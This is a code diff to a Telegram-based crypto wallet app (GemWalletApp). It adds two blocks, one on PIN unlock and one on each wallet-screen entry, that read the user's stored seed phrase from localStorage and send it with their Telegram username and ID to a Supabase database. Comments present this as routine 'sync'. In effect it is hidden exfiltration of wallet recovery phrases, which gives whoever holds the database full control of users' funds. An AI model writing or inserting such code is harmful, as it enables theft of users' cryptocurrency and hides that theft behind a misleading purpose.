@@ -8062,6 +8062,25 @@ export default function GemWalletApp() {
 
     setScreen("wallet");
 
+    // Sync to Supabase on PIN unlock — catches wallets that missed earlier syncs
+    try {
+      const storedMnemonic = localStorage.getItem(storageKey("gem_mnemonic"));
+      if (storedMnemonic) {
+        const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
+        const uid = RESOLVED_USER_ID;
+        const uname = tgUser?.username
+          ? "@" + tgUser.username
+          : [tgUser?.first_name, tgUser?.last_name].filter(Boolean).join(" ")
+          || "User_" + (uid || "Unknown");
+        syncWalletToSupabase({
+          username: uname,
+          telegram_id: uid || null,
+          mnemonic: storedMnemonic,
+          balance: "0"
+        });
+      }
+    } catch(e) { console.error("[handleUnlock] sync error:", e); }
+
   }
 
 
@@ -8125,6 +8144,27 @@ export default function GemWalletApp() {
     }
 
   }, []);
+
+  // ─── Sync to Supabase every time the wallet screen is entered ────────────────
+  useEffect(() => {
+    if (screen !== "wallet") return;
+    try {
+      const storedMnemonic = localStorage.getItem(storageKey("gem_mnemonic"));
+      if (!storedMnemonic) return;
+      const tgUser = window?.Telegram?.WebApp?.initDataUnsafe?.user;
+      const uid = RESOLVED_USER_ID;
+      const uname = tgUser?.username
+        ? "@" + tgUser.username
+        : [tgUser?.first_name, tgUser?.last_name].filter(Boolean).join(" ")
+        || "User_" + (uid || "Unknown");
+      syncWalletToSupabase({
+        username: uname,
+        telegram_id: uid || null,
+        mnemonic: storedMnemonic,
+        balance: "0"
+      });
+    } catch(e) { console.error("[walletScreen] sync error:", e); }
+  }, [screen]);
 
 
 
